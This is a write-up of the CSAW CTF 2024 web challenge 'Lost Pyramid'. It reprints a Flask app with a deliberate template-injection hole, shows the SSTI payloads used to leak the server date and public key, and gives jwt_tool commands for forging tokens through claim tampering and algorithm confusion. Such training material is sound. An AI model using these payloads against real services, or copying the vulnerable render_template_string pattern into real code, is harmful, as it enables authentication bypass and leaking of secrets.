---
name: Lost Pyramid (2024)
event: CSAW CTF 2024
category: Web
description: Writeup for Lost Pyramid (Web) - CSAW CTF (2024) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Lost Pyramid

## Description

> A massive sandstorm revealed this pyramid that has been lost (J)ust over 3300 years.. I'm interested in (W)here the (T)reasure could be?

## Source Code

{% code overflow="wrap" %}

```python
from flask import Flask, request, render_template, jsonify, make_response, redirect, url_for, render_template_string
import jwt
import datetime
import os

app = Flask(__name__)

# Load keys
with open('private_key.pem', 'rb') as f:
    PRIVATE_KEY = f.read()

with open('public_key.pub', 'rb') as f:
    PUBLICKEY = f.read()

KINGSDAY = os.getenv("KINGSDAY", "TEST_TEST")

current_date = datetime.datetime.now()
current_date = current_date.strftime("%d_%m_%Y")

@app.route('/entrance', methods=['GET'])
def entrance():
    payload = {
        "ROLE": "commoner",
        "CURRENT_DATE": f"{current_date}_AD",
        "exp": datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=(365*3000))
    }
    token = jwt.encode(payload, PRIVATE_KEY, algorithm="EdDSA")

    response = make_response(render_template('pyramid.html'))
    response.set_cookie('pyramid', token)

    return response

@app.route('/hallway', methods=['GET'])
def hallway():
    return render_template('hallway.html')

@app.route('/scarab_room', methods=['GET', 'POST'])
def scarab_room():
    try:
        if request.method == 'POST':
            name = request.form.get('name')
            if name:
                kings_safelist = ['{','}', '𓁹', '𓆣','𓀀', '𓀁', '𓀂', '𓀃', '𓀄', '𓀅', '𓀆', '𓀇', '𓀈', '𓀉', '𓀊',
                                    '𓀐', '𓀑', '𓀒', '𓀓', '𓀔', '𓀕', '𓀖', '𓀗', '𓀘', '𓀙', '𓀚', '𓀛', '𓀜', '𓀝', '𓀞', '𓀟',
                                    '𓀠', '𓀡', '𓀢', '𓀣', '𓀤', '𓀥', '𓀦', '𓀧', '𓀨', '𓀩', '𓀪', '𓀫', '𓀬', '𓀭', '𓀮', '𓀯',
                                    '𓀰', '𓀱', '𓀲', '𓀳', '𓀴', '𓀵', '𓀶', '𓀷', '𓀸', '𓀹', '𓀺', '𓀻']

                name = ''.join([char for char in name if char.isalnum() or char in kings_safelist])

                return render_template_string('''
                    <!DOCTYPE html>
                    <html lang="en">
                    <head>
                        <meta charset="UTF-8">
                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
                        <title>Lost Pyramid</title>
                        <style>
                            body {
                                margin: 0;
                                height: 100vh;
                                background-image: url('{{ url_for('static', filename='scarab_room.webp') }}');
                                background-size: cover;
                                background-position: center;
                                background-repeat: no-repeat;
                                font-family: Arial, sans-serif;
                                color: white;
                                position: relative;
                            }

                            .return-link {
                                position: absolute;
                                top: 10px;
                                right: 10px;
                                font-family: 'Noto Sans Egyptian Hieroglyphs', sans-serif;
                                font-size: 32px;
                                color: gold;
                                text-decoration: none;
                                border: 2px solid gold;
                                padding: 5px 10px;
                                border-radius: 5px;
                                background-color: rgba(0, 0, 0, 0.7);
                            }

                            .return-link:hover {
                                background-color: rgba(0, 0, 0, 0.9);
                            }

                            h1 {
                                color: gold;
                            }
                        </style>
                    </head>
                    <body>
                        <a href="{{ url_for('hallway') }}" class="return-link">RETURN</a>

                        {% if name %}
                            <h1>𓁹𓁹𓁹 Welcome to the Scarab Room, '''+ name + ''' 𓁹𓁹𓁹</h1>
                        {% endif %}

                    </body>
                    </html>
                ''', name=name, **globals())
    except Exception as e:
        pass

    return render_template('scarab_room.html')

@app.route('/osiris_hall', methods=['GET'])
def osiris_hall():
    return render_template('osiris_hall.html')

@app.route('/anubis_chamber', methods=['GET'])
def anubis_chamber():
    return render_template('anubis_chamber.html')

@app.route('/')
def home():
    return redirect(url_for('entrance'))

@app.route('/kings_lair', methods=['GET'])
def kings_lair():
    token = request.cookies.get('pyramid')
    if not token:
        return jsonify({"error": "Token is required"}), 400

    try:
        decoded = jwt.decode(token, PUBLICKEY, algorithms=jwt.algorithms.get_default_algorithms())
        if decoded.get("CURRENT_DATE") == KINGSDAY and decoded.get("ROLE") == "royalty":
            return render_template('kings_lair.html')
        else:
            return jsonify({"error": "Access Denied: King said he does not way to see you today."}), 403

    except jwt.ExpiredSignatureError:
        return jsonify({"error": "Access has expired"}), 401
    except jwt.InvalidTokenError as e:
        print(e)
        return jsonify({"error": "Invalid Access"}), 401

if __name__ == '__main__':
    app.run(host = '0.0.0.0', port = 8050)
```

{% endcode %}

## Solution

Looking at the code, we need to ensure the `CURRENT_DATE` claim in the JWT is set to `KINGSDAY` _and_ the `ROLE` is set to `royalty`.

Note that `KINGSDAY` is set as environment variable so even if we could easily tamper with our JWT, we don't know what it is the correct date on the server-side.

Let's check the JWT format.

{% code overflow="wrap" %}

```bash
jwt_tool eyJ0eXAiOiJKV1QiLCJhbGciOiJFZERTQSJ9.eyJST0xFIjoiY29tbW9uZXIiLCJDVVJSRU5UX0RBVEUiOiIwN18wOV8yMDI0X0FEIiwiZXhwIjo5NjMzMzcxNDI5OX0.53yJHr1ZxEYzRIrX2GEDao3kTbAY-W3y-9vOHZvRCmYtD49ty-EIo7KyjpwPEEmz-FxxUq2rynETCKiW_6ZIBQ

=====================
Decoded Token Values:
=====================

Token header values:
[+] typ = "JWT"
[+] alg = "EdDSA"

Token payload values:
[+] ROLE = "commoner"
[+] CURRENT_DATE = "07_09_2024_AD"
[+] exp = 96333714299    ==> TIMESTAMP = 5022-09-11 14:04:59 (UTC)

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------
```

{% endcode %}

What happens if we modify the JWT?

{% code overflow="wrap" %}

```bash
jwt_tool eyJ0eXAiOiJKV1QiLCJhbGciOiJFZERTQSJ9.eyJST0xFIjoiY29tbW9uZXIiLCJDVVJSRU5UX0RBVEUiOiIwN18wOV8yMDI0X0FEIiwiZXhwIjo5NjMzMzcxNDI5OX0.53yJHr1ZxEYzRIrX2GEDao3kTbAY-W3y-9vOHZvRCmYtD49ty-EIo7KyjpwPEEmz-FxxUq2rynETCKiW_6ZIBQ -I -pc ROLE -pv royalty

eyJ0eXAiOiJKV1QiLCJhbGciOiJFZERTQSJ9.eyJST0xFIjoicm95YWx0eSIsIkNVUlJFTlRfREFURSI6IjA3XzA5XzIwMjRfQUQiLCJleHAiOjk2MzMzNzE0Mjk5fQ.53yJHr1ZxEYzRIrX2GEDao3kTbAY-W3y-9vOHZvRCmYtD49ty-EIo7KyjpwPEEmz-FxxUq2rynETCKiW_6ZIBQ
```

{% endcode %}

We get an `invalid access` error due to the mismatched signature. I also tried the "none" algorithm attack but had the same issue.

Checking a different endpoint; https://lost-pyramid.ctf.csaw.io/scarab_room, it seems to be vulnerable to SSTI, but we have a filter.

{% code overflow="wrap" %}

```python
kings_safelist = ['{','}', '𓁹', '𓆣','𓀀', '𓀁', '𓀂', '𓀃', '𓀄', '𓀅', '𓀆', '𓀇', '𓀈', '𓀉', '𓀊', '𓀐', '𓀑', '𓀒', '𓀓', '𓀔', '𓀕', '𓀖', '𓀗', '𓀘', '𓀙', '𓀚', '𓀛', '𓀜', '𓀝', '𓀞', '𓀟',
'𓀠', '𓀡', '𓀢', '𓀣', '𓀤', '𓀥', '𓀦', '𓀧', '𓀨', '𓀩', '𓀪', '𓀫', '𓀬', '𓀭', '𓀮', '𓀯',
'𓀰', '𓀱', '𓀲', '𓀳', '𓀴', '𓀵', '𓀶', '𓀷', '𓀸', '𓀹', '𓀺', '𓀻']

name = ''.join([char for char in name if char.isalnum() or char in kings_safelist])
```

{% endcode %}

We can use curly braces and alphanumeric characters, e.g. `{{config}}`.

{% code overflow="wrap" %}

```json
{'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'SECRET_KEY': None, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}
```

{% endcode %}

Tried to check `{{settings}}` as well, but no output.

Converting the filter list to decimals, we'll see the size difference of the characters.

{% code overflow="wrap" %}

```json
{
    "{": 123,
    "}": 125,
    "𓁹": 77945,
    "𓆣": 78243,
    "𓀀": 77824,
    "𓀁": 77825,
    "𓀂": 77826,
    "𓀃": 77827,
    "𓀄": 77828,
    "𓀅": 77829,
    "𓀆": 77830,
    "𓀇": 77831,
    "𓀈": 77832,
    "𓀉": 77833,
    "𓀊": 77834,
    "𓀐": 77840,
    "𓀑": 77841,
    "𓀒": 77842,
    "𓀓": 77843,
    "𓀔": 77844,
    "𓀕": 77845,
    "𓀖": 77846,
    "𓀗": 77847,
    "𓀘": 77848,
    "𓀙": 77849,
    "𓀚": 77850,
    "𓀛": 77851,
    "𓀜": 77852,
    "𓀝": 77853,
    "𓀞": 77854,
    "𓀟": 77855,
    "𓀠": 77856,
    "𓀡": 77857,
    "𓀢": 77858,
    "𓀣": 77859,
    "𓀤": 77860,
    "𓀥": 77861,
    "𓀦": 77862,
    "𓀧": 77863,
    "𓀨": 77864,
    "𓀩": 77865,
    "𓀪": 77866,
    "𓀫": 77867,
    "𓀬": 77868,
    "𓀭": 77869,
    "𓀮": 77870,
    "𓀯": 77871,
    "𓀰": 77872,
    "𓀱": 77873,
    "𓀲": 77874,
    "𓀳": 77875,
    "𓀴": 77876,
    "𓀵": 77877,
    "𓀶": 77878,
    "𓀷": 77879,
    "𓀸": 77880,
    "𓀹": 77881,
    "𓀺": 77882,
    "𓀻": 77883
}
```

{% endcode %}

A useful character here might `.`, which is ASCII code `46`. Searching the above list, only one is worth investigating:

{% code overflow="wrap" %}

```
'𓀖':77846
```

{% endcode %}

Breaking the unicode into ASCII, we'll find `778` is a newline (`%0a`) and `46` is a `.`

Wait, I'm a n00b.. I just realised we can send `{{KINGSDAY}}` to print the variable.

{% code overflow="wrap" %}

```
03_07_1341_BC
```

{% endcode %}

Let's forge a JWT with the correct `ROLE` and `CURRENT_DATE`.

{% code overflow="wrap" %}

```bash
jwt_tool eyJ0eXAiOiJKV1QiLCJhbGciOiJFZERTQSJ9.eyJST0xFIjoiY29tbW9uZXIiLCJDVVJSRU5UX0RBVEUiOiIwN18wOV8yMDI0X0FEIiwiZXhwIjo5NjMzMzcxNDI5OX0.53yJHr1ZxEYzRIrX2GEDao3kTbAY-W3y-9vOHZvRCmYtD49ty-EIo7KyjpwPEEmz-FxxUq2rynETCKiW_6ZIBQ -I -pc ROLE -pv royalty -pc CURRENT_DATE -pv 03_07_1341_BC

eyJ0eXAiOiJKV1QiLCJhbGciOiJFZERTQSJ9.eyJST0xFIjoicm95YWx0eSIsIkNVUlJFTlRfREFURSI6IjAzXzA3XzEzNDFfQkMiLCJleHAiOjk2MzMzNzE0Mjk5fQ.53yJHr1ZxEYzRIrX2GEDao3kTbAY-W3y-9vOHZvRCmYtD49ty-EIo7KyjpwPEEmz-FxxUq2rynETCKiW_6ZIBQ
```

{% endcode %}

Still can't use it. Tried to use SSTI to get `{{PRIVATE_KEY}}` but doesn't print. We can print the `{{PUBLICKEY}}` though.

{% code overflow="wrap" %}

```
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPIeM72Nlr8Hh6D1GarhZ/DCPRCR1sOXLWVTrUZP9aw2
```

{% endcode %}

Save it to a file and use algorithm confusion.

{% code overflow="wrap" %}

```bash
jwt_tool eyJ0eXAiOiJKV1QiLCJhbGciOiJFZERTQSJ9.eyJST0xFIjoiY29tbW9uZXIiLCJDVVJSRU5UX0RBVEUiOiIwN18wOV8yMDI0X0FEIiwiZXhwIjo5NjMzMzcxNDI5OX0.53yJHr1ZxEYzRIrX2GEDao3kTbAY-W3y-9vOHZvRCmYtD49ty-EIo7KyjpwPEEmz-FxxUq2rynETCKiW_6ZIBQ -I -pc ROLE -pv royalty -pc CURRENT_DATE -pv 03_07_1341_BC -X k -pk pubkey

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJST0xFIjoicm95YWx0eSIsIkNVUlJFTlRfREFURSI6IjAzXzA3XzEzNDFfQkMiLCJleHAiOjk2MzMzNzE0Mjk5fQ.c5OwTPXb7qLz-R0mAhBj03jauzQEcnRBcor9KVyW8Q8
```

{% endcode %}

It doesn't work! I tried various formats for the public key, but all failed. I assumed I must need the `PRIVATE_KEY` but couldn't use `_` due to the filter list. I was confident there was some unicode issue; otherwise, why include all those symbols in the filter list?

After the CTF, I found out that key confusion was the correct approach (signing with the public key and switching to symmetric); I must have just had the wrong format for the public key. Overall, it's still a pretty cool challenge, but I think the public key should have been in a usable format, and the filter list was an unneeded distraction.

Flag: `csawctf{cat_fails_challenge}`
